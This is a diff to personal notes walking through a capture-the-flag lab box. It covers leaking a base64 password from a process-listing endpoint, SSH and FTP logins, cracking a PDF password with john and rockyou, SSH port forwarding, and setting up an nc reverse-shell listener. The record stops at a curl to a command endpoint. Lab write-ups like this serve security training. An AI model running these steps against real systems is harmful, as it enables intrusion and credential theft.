@@ -74,11 +74,74 @@ http://192.168.59.99:33333/list-active-nodes
     curl -X POST http://192.168.59.99:33333/list-current-deployments -d "{}"
 nope.
 
+    curl -X POST http://192.168.59.99:33333/list-active-nodes -d "{}"
+nothing.
+
     curl -X POST http://192.168.59.99:33333/list-running-procs -d "{}"
     name        : cmd.exe
     commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
                   "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
 got it.
 
+    ssh ariah@192.168.59.99
+    Tm93aXNlU2xvb3BUaGVvcnkxMzkK
 
-curl -X POST http://192.168.59.99:33333/list-active-nodes -d "{}"
+nope. must be ftp.
+
+    ftp ariah@192.168.59.99
+    Tm93aXNlU2xvb3BUaGVvcnkxMzkK
+
+nope.
+
+OH. it's base64. thanks claude.
+
+NowiseSloopTheory139
+
+    ssh ariah@192.168.59.99
+    NowiseSloopTheory139
+    powershell
+    cat C:\Users\ariah\Desktop\local.txt
+    # bam, user flag pwned.
+
+now...what's next?
+
+    ls C:\Users\ariah\Documents\
+
+well. let's try FTP.
+
+
+    ftp ariah@192.168.59.99
+    NowiseSloopTheory139
+    passive
+    get Infrastructure.pdf
+
+now. how do we crack it?
+
+    pdf2john Infrastructure.pdf > Infrastructure.hash
+    sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+    john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt
+    ariah4168
+
+nice, got it.
+
+    sudo apt install okular
+
+    Infrastructure Notes
+    Temporary Command endpoint: http://nickel/?
+    Backup system: http://nickel-backup/backup
+    NAS: http://corp-nas/files
+    
+    
+great. now to punch through port 80.
+
+    ssh -L 8082:nickel:80 ariah@192.168.59.99
+    NowiseSloopTheory139
+
+
+and now to start a rev shell listener on our attacker.
+
+    nc -nvlp 4444
+
+and to trigger a connection to it.
+
+    curl localhost:8082/?command=sleep&203
